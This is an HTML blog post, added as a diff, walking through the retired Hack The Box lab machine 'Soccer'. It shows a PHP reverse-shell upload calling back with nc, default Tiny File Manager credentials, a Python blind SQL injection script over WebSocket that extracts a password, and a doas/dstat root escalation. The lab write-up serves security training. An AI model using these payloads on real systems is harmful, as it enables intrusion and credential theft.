@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Soccer – Will Lindsey</title>
+  <meta name="description" content="A walkthrough of HackTheBox's Soccer – default credentials, PHP upload RCE, WebSocket SQLi, and doas/dstat privilege escalation.">
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><text y='32' font-size='32'>💻</text></svg>">
+</head>
+<body>
+  <header>
+    <nav>
+      <a href="/" class="site-title">Will Lindsey</a>
+      <ul>
+        <li><a href="/">About</a></li>
+        <li><a href="/blog/">Blog</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <a href="/blog/" class="back-link">← Blog</a>
+    <div class="post-header">
+      <h1>Soccer</h1>
+      <div class="post-meta">
+        <time>Jun 6, 2023</time>
+        <span class="post-tags">
+          <span class="tag">hack-the-box</span>
+          <span class="tag">easy</span>
+          <span class="tag">SQLi</span>
+        </span>
+      </div>
+    </div>
+
+    <article>
+      <h2>Introduction</h2>
+
+      <p>Hack the Box is one of the cybersecurity upskilling platforms I use for professional development. Roughly once a week, Hack the Box releases a new vulnerable box for users to hack. Additionally, one active box is retired every week. Below is a walkthrough on compromising the recently retired box, "Soccer."</p>
+
+      <h2>Summary</h2>
+
+      <p><a href="https://hackthebox.com/machines/soccer" target="_blank" rel="noopener noreferrer">Soccer Hack The Box</a></p>
+
+      <p>Soccer is hosting a website that exposes a website admin login page still configured with default credentials. Once I log in, I am able to upload a PHP file, granting me RCE (Remote Code Execution) on the box. While enumerating the box, I come across a new subdomain of the website. Upon exploring the subdomain, I discover a blind, boolean-based SQL injection vulnerability, which I exploit to obtain the user's credentials. Logged in as a user, I find that "doas" is configured to allow me to run "dstat". This configuration enables me to obtain a root shell.</p>
+
+      <h2>Port Scanning</h2>
+
+      <p><code>nmap</code> finds TCP ports 22, 80 and 9091 open.</p>
+
+<pre><code>┌──(kali 🛸 box)-[~/workSpace/Boxes/Soccer]
+└─$ nmap 10.10.11.194
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 13:49 EDT
+Nmap scan report for 10.10.11.194
+Host is up (0.027s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9091/tcp open  xmltec-xmlmail</code></pre>
+
+      <h2>Enumerating port 80</h2>
+
+      <h3>Web Browser</h3>
+      <p>Navigating to <code>http://10.10.11.194</code> I am redirected to <code>soccer.htb</code>. I add <code>soccer.htb</code> to <code>/etc/hosts</code> and reload the page. I find the "HTB FootBall Club."</p>
+
+      <img src="/assets/img/s1.png" alt="HTB FootBall Club website" class="post-img">
+
+      <p>Looking around the website doesn't give any interesting results.</p>
+
+      <h3>Directory Enumeration</h3>
+      <p>I use <code>gobuster</code> and the word list <code>directory-list-2.3-small.txt</code> to discover the directory <code>tiny</code>.</p>
+
+<pre><code>┌──(kali box)-[~/workSpace/Boxes/Soccer/httpsoccer.htb]
+└─$ gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://soccer.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] Timeout:                 10s
+===============================================================
+2023/06/18 14:20:40 Starting gobuster in directory enumeration mode
+===============================================================
+/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
+Progress: 87591 / 87665 (99.92%)
+===============================================================
+2023/06/18 14:24:23 Finished</code></pre>
+
+      <p>Visiting <code>http://soccer.htb/tiny/</code> I encounter a login screen.</p>
+
+      <img src="/assets/img/s2.png" alt="Tiny File Manager login page" class="post-img">
+
+      <p>Googling "Tiny File Manager default credentials" I find <code>admin:admin@123</code>. I am able to login with these credentials!</p>
+
+      <img src="/assets/img/s3.png" alt="Tiny File Manager dashboard" class="post-img">
+
+      <p>Looking around I discover I can upload a <code>php</code> file to the uploads directory. This will allow me to obtain a foothold on the box.</p>
+
+      <h2>Foothold</h2>
+
+      <p>I upload the following PHP file to the uploads directory. I then navigate to the file I uploaded to initiate my reverse shell.</p>
+
+<pre><code>&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 9595&gt;/tmp/f')?&gt;</code></pre>
+
+      <div class="img-row">
+        <img src="/assets/img/s4.png" alt="Uploading PHP shell via Tiny File Manager" class="post-img">
+        <img src="/assets/img/s5.png" alt="PHP shell uploaded successfully" class="post-img">
+      </div>
+
+<pre><code>┌──(kali box)-[~/workSpace/Boxes/Soccer]
+└─$ nc -lvnp 9595
+listening on [any] 9595 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.11.194] 59412
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash");'
+www-data@soccer:~/html/tiny/uploads$ ^Z
+zsh: suspended  nc -lvnp 9595
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+└─$ stty raw -echo; fg % 1
+[1]  + continued  nc -lvnp 9595
+                               export TERM=screen
+www-data@soccer:~/html/tiny/uploads$ whoami
+www-data</code></pre>
+
+      <h2>User</h2>
+
+      <p>From here I ran <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230618-1fa055b6" target="_blank" rel="noopener noreferrer">linpeas</a>. Looking through the output I noticed the subdomain <code>soc-player</code> in <code>/etc/hosts</code>.</p>
+
+<pre><code>www-data@soccer:~/html/tiny/uploads$ cat /etc/hosts
+127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb</code></pre>
+
+      <p>Adding <code>soc-player.soccer.htb</code> to <code>/etc/hosts</code> and navigating to the subdomain in my browser, I find a page similar to "HTB FootBall Club," but with a Signup page. I sign up for an account.</p>
+
+      <img src="/assets/img/s6.png" alt="soc-player.soccer.htb signup page" class="post-img">
+
+      <p>Signing in with the account I created, I am able to check for valid tickets.</p>
+
+      <div class="img-row">
+        <img src="/assets/img/s7.png" alt="Ticket checker interface" class="post-img">
+        <img src="/assets/img/s8.png" alt="Ticket checker result" class="post-img">
+      </div>
+
+      <p>Looking at the traffic in Burp, I see that this feature is being accomplished using a WebSocket. Now I see why this box is called soccer and not football!</p>
+
+      <img src="/assets/img/s9.png" alt="Burp Suite showing WebSocket traffic" class="post-img">
+
+      <p>With a little help from Python's <code>websocket</code> library we are able to discover a boolean-based blind SQL injection.</p>
+
+      <p><strong>test.py</strong></p>
+
+<pre><code>import websocket, json
+
+ws = websocket.WebSocket()
+ws.connect("ws://soc-player.soccer.htb:9091")
+data = {"id": "1"}  # Normal data
+ws.send(str(json.dumps(data)))
+result = ws.recv()
+print(result)
+
+data = {"id": "1 or 1=1"}  # Injecting boolean logic
+ws.send(str(json.dumps(data)))
+result = ws.recv()
+print(result)</code></pre>
+
+      <p>Running the above code I see that I am able to inject SQL logic.</p>
+
+<pre><code>┌──(kali box)-[~/workSpace/Boxes/Soccer]
+└─$ python3 test.py
+Ticket Doesn't Exist
+Ticket Exists</code></pre>
+
+      <p>Using <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#identifying-back-end" target="_blank" rel="noopener noreferrer">HackTricks SQL-Injection Identifying Back-End</a> I determine that the backend is likely MySQL. I can use this boolean injection to enumerate the database character by character — if a condition is true, the server responds "Ticket Exists"; if false, "Ticket Doesn't Exist".</p>
+
+      <p>Rather than doing this manually, I wrote a Python script to automate the enumeration.</p>
+
+      <p><strong>soccer_sqli.py</strong></p>
+
+<pre><code>import websocket, json, sys
+
+alpha_b = "q w e r t y u i o p a s d f g h j k l z x c v b n m 0 1 2 3 4 5 6 7 8 9 _ -"
+alpha_b_list = alpha_b.split()
+ALPHA_B = "Q W E R T Y U I O P A S D F G H J K L Z X C V B N M q w e r t y u i o p a s d f g h j k l z x c v b n m 0 1 2 3 4 5 6 7 8 9 ! @ # $ ^ &amp; * ( ) ? &gt; &lt; , . [ ] { } _ -"
+ALPHA_B_LIST = ALPHA_B.split()
+
+def get_from_db(payload, replacement_text, full_list=False):
+    payload = dict(payload)
+    payload['id'] = payload['id'].replace("__replace__", replacement_text)
+    ws = websocket.WebSocket()
+    ws.connect("ws://soc-player.soccer.htb:9091")
+    end_of_word = False
+    this_word = ""
+    letter_list = ALPHA_B_LIST if full_list else alpha_b_list
+
+    while not end_of_word:
+        end_of_word = True
+        found_letter = False
+        for letter in letter_list:
+            current_word = this_word + letter
+            d = {"id": payload['id'].replace('__loop__', current_word)}
+            ws.send(str(json.dumps(d)))
+            result = ws.recv()
+            if result == "Ticket Exists" and not found_letter:
+                this_word += letter
+                found_letter = True
+                end_of_word = False
+                print(this_word)
+    return this_word
+
+payload = {"id": f"1 UNION SELECT 1,2,3 __replace__-- -"}
+inject = sys.argv[1]
+get_from_db(payload, inject, full_list=(sys.argv[2].lower() == 't'))</code></pre>
+
+      <p>First I get the name of the database I am currently working in.</p>
+
+<pre><code>┌──(kali box)-[~/workSpace/Boxes/Soccer]
+└─$ python3 soccer_sqli.py "WHERE database() like '__loop__%'" f
+s
+so
+soc
+socc
+socce
+soccer
+soccer_
+soccer_d
+soccer_db</code></pre>
+
+      <p>Now I use my script to look for tables in <code>soccer_db</code>, then enumerate columns, then extract credentials.</p>
+
+<pre><code>┌──(kali box)-[~/workSpace/Boxes/Soccer]
+└─$ python3 soccer_sqli.py "FROM information_schema.tables where table_schema = 'soccer_db' and table_name like '__loop__%'" f
+accounts
+
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+└─$ python3 soccer_sqli.py "FROM accounts where username like '__loop__%'" f
+player
+
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+└─$ python3 soccer_sqli.py "FROM accounts where password like BINARY '__loop__%'" t
+P
+Pl
+...
+PlayerOftheMatch2022</code></pre>
+
+      <p>I have now discovered the credentials <code>player:PlayerOftheMatch2022</code>. I SSH in as <code>player</code> and obtain the <code>user.txt</code> flag.</p>
+
+<pre><code>┌──(kali box)-[~/workSpace/Boxes/Soccer]
+└─$ ssh player@10.10.11.194
+player@10.10.11.194's password:
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+player@soccer:~$ cat user.txt |wc
+      1       1      33</code></pre>
+
+      <h2>Root</h2>
+
+      <p>Looking at which applications have the SUID bit set I discover an unusual one, <code>doas</code>.</p>
+
+<pre><code>player@soccer:~$ find / -perm -4000 2>/dev/null
+/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/sudo
+...</code></pre>
+
+      <p>Looking at <code>doas.conf</code> I see I am able to run <code>dstat</code> as root.</p>
+
+<pre><code>player@soccer:~$ cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat</code></pre>
+
+      <p>Looking up <code>dstat</code> on <a href="https://gtfobins.github.io/gtfobins/dstat/" target="_blank" rel="noopener noreferrer">GTFOBins</a> I find a suitable privilege escalation. I just need to replace <code>sudo</code> with the <code>doas</code> command.</p>
+
+<pre><code>player@soccer:~$ echo 'import os; os.execv("/bin/sh", ["sh"])' &gt;/usr/local/share/dstat/dstat_xxx.py
+player@soccer:~$ doas /usr/bin/dstat --xxx
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib
+  import imp
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt |wc
+      1       1      33</code></pre>
+
+      <h2>Conclusion</h2>
+
+      <p>"Soccer" is an example of one of the many intriguing challenges available on Hack the Box. I intend to publish walkthroughs of future retired boxes as I continue using the platform to broaden my knowledge.</p>
+    </article>
+  </main>
+
+  <footer>
+    &copy; 2026 Will Lindsey
+  </footer>
+</body>
+</html>
